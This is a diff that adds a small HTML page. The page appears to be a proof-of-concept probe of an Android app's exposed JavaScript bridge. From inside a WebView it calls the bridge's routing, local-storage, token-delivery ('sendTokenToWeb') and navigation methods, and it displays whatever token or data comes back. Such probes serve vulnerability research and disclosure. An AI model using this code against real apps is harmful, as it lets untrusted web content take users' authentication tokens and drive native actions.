@@ -1,0 +1,26 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>BGD</title></head>
+<body style="font:15px monospace;background:#fff;color:#000">
+<div id="o">boot</div>
+<script>
+var L=[],t0=Date.now();
+function log(s){L.push("+"+((Date.now()-t0)/1000).toFixed(1)+"s "+s);document.getElementById('o').textContent=L.join("\n");}
+log("HOST="+location.host+" BRIDGE="+(!!window.control)+" N="+(window.control?Object.keys(control).length:0));
+setTimeout(function(){
+  if(!window.control){log("NO BRIDGE");return;}
+  // 1) nativeRouter x3 -> each creates a WebActivity if allowed (visible via dumpsys)
+  ["/web/main/h5?url=https%3A%2F%2Fexample.org%2F%3Fnr1",
+   "/web/main/h5?url=https%3A%2F%2Fexample.org%2F%3Fnr2",
+   "/web/main/h5?url=https%3A%2F%2Fexample.org%2F%3Fnr3"].forEach(function(p,i){
+     try{ control.nativeRouter(p); log("nativeRouter("+(i+1)+") returned"); }catch(e){ log("THROW nr"+i+" "+e); }
+  });
+  log("--- now getWebLocalStorage with callback ---");
+  window.cbLS=function(d){log("CALLBACK getWebLocalStorage="+(typeof d=="string"?d.slice(0,200):JSON.stringify(d).slice(0,200)));};
+  try{ control.getWebLocalStorage(JSON.stringify({key:"__probe",callbackFun:"cbLS"})); log("getWebLocalStorage returned"); }catch(e){ log("THROW ls "+e); }
+  log("--- now sendTokenToWeb ---");
+  window.cbTK=function(d){log("CALLBACK sendTokenToWeb="+(typeof d=="string"?d.slice(0,300):JSON.stringify(d).slice(0,300)));};
+  try{ control.sendTokenToWeb("cbTK"); log("sendTokenToWeb returned"); }catch(e){ log("THROW tk "+e); }
+  log("--- now navigationGoback (closes this WebView if allowed) ---");
+  try{ control.navigationGoback(); log("navigationGoback returned"); }catch(e){ log("THROW gb "+e); }
+},2500);
+setTimeout(function(){log("t=40s FINAL(if still visible: goback was denied)");},40000);
+</script></body></html>
